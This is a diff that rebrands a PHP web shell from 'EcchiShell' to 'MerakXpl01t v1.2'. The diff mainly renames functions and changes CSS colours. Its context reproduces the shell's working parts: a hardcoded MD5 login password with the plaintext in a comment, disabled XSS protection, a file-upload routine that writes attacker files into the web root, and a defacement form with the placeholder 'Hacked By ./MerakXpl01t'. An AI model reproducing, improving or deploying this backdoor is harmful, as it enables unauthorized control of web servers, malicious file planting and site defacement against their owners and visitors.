@@ -16,6 +16,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 
 $password = "329eadfcb8f4deee2155009da4545105"; # md5: m01t
 
+
 function login_shell() {
 ?>
 <!DOCTYPE HTML>
@@ -94,7 +95,7 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 <!--
 ###############################################################################
 // Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
-// Special Thanks Untuk IndoXploit dan Ecchi shell sebagai referensi utama shell ini.
+// Thanks Untuk IndoXploit dan Ecchi shell sebagai referensi utama shell ini.
 // Greetz: All Member MerakXpl01t. & All My Friends.
 ###############################################################################
 -->
@@ -143,7 +144,7 @@ table, th, td {
 }
 
 .table_home, .th_home, .td_home {
-	border: 1px solid #ffffff;
+	border: 1px solid #000000;
 }
 
 .th_home {
@@ -151,7 +152,7 @@ table, th, td {
 }
 
 .td_home, .td_home > a {
-	color: #ffffff;
+	color: #000000;
 }
 
 .td_home > a:hover {
@@ -164,7 +165,7 @@ th {
 
 tr:hover {
 	background: #006400;
-	color: #ffffff;
+	color: #000000;
 }
 
 input[type=text], input[type=password], .input {
@@ -196,7 +197,7 @@ textarea {
 	margin: 10px auto;
 	resize: none;
 	background: transparent;
-	color: #ffffff;
+	color: #000000;
 	font-family: 'Ubuntu';
 	font-size: 13px;
 }
@@ -213,7 +214,7 @@ iframe {
 header('User-Agent:' . randomagent());
 header("X-XSS-Protection: 0");
 
-define('version', '1.0');
+define('version', '1.2');
 define('author', 'MerakXpl01t');
 
 set_time_limit(0);
@@ -233,11 +234,11 @@ if (version_compare(PHP_VERSION, '5.3.0', '<')) {
 
 if (version_compare(PHP_VERSION, '8.0.0', '<')) {
    if (get_magic_quotes_gpc()) {
-      function ecchi($array)
+      function merak($array)
       {
-         return is_array($array) ? array_map('ecchi', $array) : stripslashes($array);
+         return is_array($array) ? array_map('merak', $array) : stripslashes($array);
       }
-      $_POST = ecchi($_POST);
+      $_POST = merak($_POST);
    }
 }
 
@@ -474,7 +475,7 @@ function shell()
       <meta name="robots" content="noindex, nofollow">
       <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
-      <title>EcchiShell v1.0</title>
+      <title>MerakXpl01t v1.2</title>
       <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    </head>
 
@@ -580,17 +581,17 @@ function shell()
             $act = 'Chose File To Upload!!';
             if ($_POST['upload']) {
                if ($_POST['type_upload'] == 'noroot') {
-                  if (@copy($_FILES['ecchifile']['tmp_name'], "$dir/" . $_FILES['ecchifile']['name'])) {
-                     $act = "Uploaded! at <i><b>$dir/" . $_FILES['ecchifile']['name'] . "</b></i>";
+                  if (@copy($_FILES['merakfile']['tmp_name'], "$dir/" . $_FILES['merakfile']['name'])) {
+                     $act = "Uploaded! at <i><b>$dir/" . $_FILES['merakfile']['name'] . "</b></i>";
                   } else {
                      $act = "failed to upload file";
                   }
                } else {
-                  $root = $_SERVER['DOCUMENT_ROOT'] . "/" . $_FILES['ecchifile']['name'];
-                  $web = $_SERVER['HTTP_HOST'] . "/" . $_FILES['ecchifile']['name'];
+                  $root = $_SERVER['DOCUMENT_ROOT'] . "/" . $_FILES['merakfile']['name'];
+                  $web = $_SERVER['HTTP_HOST'] . "/" . $_FILES['merakfile']['name'];
 
                   if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
-                     if (@copy($_FILES['ecchifile']['tmp_name'], $root)) {
+                     if (@copy($_FILES['merakfile']['tmp_name'], $root)) {
                         $act = "Uploaded! at <i><b>$root -> </b></i><a class='font-weight-bold' href='http://$web' target='_blank'>$web</a>";
                      } else {
                         $act = "failed to upload file";
@@ -616,7 +617,7 @@ function shell()
                               <label class="form-check-label" for="root">root <?= w($_SERVER['DOCUMENT_ROOT'], "Writeable") ?></label>
                            </div>
                            <div class="row form-group mx-lg-n5">
-                              <input type="file" name="ecchifile" class="col form-control-file py-3 px-lg-5">
+                              <input type="file" name="merakfile" class="col form-control-file py-3 px-lg-5">
                            </div>
                            <div class="form-group">
                               <input type="submit" id="upload" name="upload" class="btn btn-outline-primary form-control" value="Submit">
@@ -677,7 +678,7 @@ function shell()
                </div>
                <div class="form-group">
                   <div class="mb-3">
-                     <textarea class="form-control" name="script" placeholder="Hacked By ./EcchiExploit" rows="5"></textarea>
+                     <textarea class="form-control" name="script" placeholder="Hacked By ./MerakXpl01t" rows="5"></textarea>
                   </div>
                </div>
                <div class="form-group">
